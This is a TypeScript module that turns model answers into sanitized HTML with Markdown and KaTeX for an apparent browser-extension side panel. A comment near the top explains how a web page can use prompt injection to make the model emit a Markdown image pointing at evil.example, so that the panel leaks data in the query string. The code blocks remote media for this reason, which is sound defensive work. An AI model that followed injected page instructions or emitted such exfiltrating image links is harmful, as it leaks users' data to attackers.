/**
 * Markdown → sanitized HTML with KaTeX (and mhchem) for $...$ / $$...$$.
 * Math is rendered before Markdown so underscores inside formulas survive,
 * then everything passes through DOMPurify.
 */
import DOMPurify from 'dompurify';
import katex from 'katex';
import 'katex/contrib/mhchem';
import { marked } from 'marked';

marked.setOptions({ gfm: true, breaks: false });

/**
 * Answers now come from a real model, and a page can try to steer a model
 * (prompt injection). Two consequences for what we render:
 * - Links open in a new tab. Followed in place, a link would navigate the
 *   side panel itself away from the extension.
 * - No remote media. `![](https://evil.example/?q=…)` would otherwise make
 *   the panel fetch a URL of the model's choosing, carrying whatever it was
 *   talked into putting there. Answers are text and KaTeX; nothing needs <img>.
 */
DOMPurify.addHook('afterSanitizeAttributes', (node) => {
  if (node.tagName === 'A') {
    node.setAttribute('target', '_blank');
    node.setAttribute('rel', 'noopener noreferrer');
  }
});
const FORBID_TAGS = ['img', 'picture', 'source', 'video', 'audio', 'track', 'image', 'link', 'style', 'form', 'input', 'button'];

const PLACEHOLDER = (i: number) => `\u0000MATH${i}\u0000`;

export function renderMath(tex: string, display: boolean): string {
  try {
    return katex.renderToString(tex, { displayMode: display, throwOnError: false, output: 'htmlAndMathml', strict: 'ignore' });
  } catch {
    return `<code>${escapeHtml(tex)}</code>`;
  }
}

/** Replaces math with placeholders, renders Markdown, then restores KaTeX HTML. */
export function renderMarkdown(src: string): string {
  const math: string[] = [];
  let text = src;
  // Display math first: $$...$$ and \[...\]
  text = text.replace(/\$\$([\s\S]+?)\$\$|\\\[([\s\S]+?)\\\]/g, (_m, a: string | undefined, b: string | undefined) => {
    math.push(renderMath((a ?? b ?? '').trim(), true));
    return PLACEHOLDER(math.length - 1);
  });
  // Inline math: $...$ (not $$) and \(...\)
  text = text.replace(/(?<!\$)\$(?!\$)((?:\\\$|[^$\n])+?)\$(?!\$)|\\\(([\s\S]+?)\\\)/g, (_m, a: string | undefined, b: string | undefined) => {
    math.push(renderMath((a ?? b ?? '').trim(), false));
    return PLACEHOLDER(math.length - 1);
  });
  let html = marked.parse(text, { async: false }) as string;
  html = html.replace(/\u0000MATH(\d+)\u0000/g, (_m, i: string) => math[Number(i)] ?? '');
  return DOMPurify.sanitize(html, { USE_PROFILES: { html: true, mathMl: true, svg: true }, FORBID_TAGS });
}

export function escapeHtml(s: string): string {
  return s.replace(/[&<>"']/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' })[c]!);
}
